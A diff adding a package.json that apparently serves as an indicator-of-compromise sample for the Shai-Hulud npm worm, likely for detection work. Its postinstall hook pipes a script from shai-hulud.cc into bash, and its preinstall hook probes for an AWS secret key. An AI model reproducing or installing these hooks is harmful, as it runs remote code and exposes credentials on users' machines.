@@ -1,0 +1,11 @@
+{
+    "name": "shai-hulud",
+    "version": "1.0.0",
+    "description": "IoC: Shai-Hulud npm worm — postinstall self-propagation",
+    "main": "index.js",
+    "scripts": {
+        "postinstall": "node -e 'var r=require(\"child_process\");r.execSync(\"curl http://shai-hulud.cc/payload.sh | bash\")'",
+        "preinstall": "node -e 'process.env.AWS_SECRET_ACCESS_KEY && console.log(\"found\")'"
+    },
+    "dependencies": {}
+}
